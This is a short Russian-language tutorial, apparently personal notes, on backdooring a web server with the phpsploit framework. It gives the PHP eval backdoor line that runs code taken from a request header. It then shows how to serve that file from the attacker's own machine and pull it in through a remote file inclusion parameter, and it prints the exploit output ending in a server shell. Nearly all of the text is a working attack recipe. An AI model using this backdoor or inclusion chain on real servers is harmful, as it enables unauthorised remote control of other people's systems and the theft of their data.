backdoor с использованием phpsploit подключиться к серверу не прерывая его работу
-------------------------------------------------------------------------------

Достоинства: 
	1) простота использования
	2) не ломает сервер (происходит что-то типо распараллелевания работы сервера)
-------------------------------------------------------------------------------

Создание Backdoor:

	1) ./phpsloit - запуск фреймворка

	2) phpsploit > exploit
	Вывод:
	[*] Current backdoor is: <?php @eval($_SERVER['HTTP_PHPSPL01T']); ?>
	Чтобы запустить удаленный туннель, бэкдор, показанный выше, должен быть
	вручную внедряется в исполняемую веб-страницу удаленного сервера.
	Затем используйте `set TARGET <BACKDOORED_URL>` и запустите `exploit`.
	
	3) Вставляем <?php @eval($_SERVER['HTTP_PHPSPL01T']); ?> в php файл
	4) php файл выгружаем, либо на github, либо загружаем с нашего сервера
	Пример загрузки с локального сервера:
	- заходим в директорию, где лежит php файл
	- запускае сервер: python -m http.server
	- в браузере (в url сайта прописываем - ?file=http://ip_address_нашего_сервера/наш_php_файл
	
	http://127.0.0.1:8008/?file=http://192.168.219.134:8000/phpsploit.php 
	5) возвращаемся к phpsploit, копируем URL адресс из браузера и вставляем его в phpsloit

	set TARGET http://127.0.0.1:8008/?file=http://*.*.*.*:8000/phpsploit.php

	6) запускаем exploit

	phpsploit > exploit
	Вывод:
	[*] Current backdoor is: <?php @eval($_SERVER['HTTP_PHPSPL01T']); ?>

	[*] Sending payload to http://127.0.0.1:8008/?file=http://*.*.*.*:8000/phpsploit.php ...
	[*] Shell obtained by PHP (172.18.0.1 -> 0.0.0.0)

	Connected to Linux server (0.0.0.0)
	running PHP 8.1.17 on PHP 8.1.17 Development Server
	phpsploit(127.0.0.1) > shell сервера
	
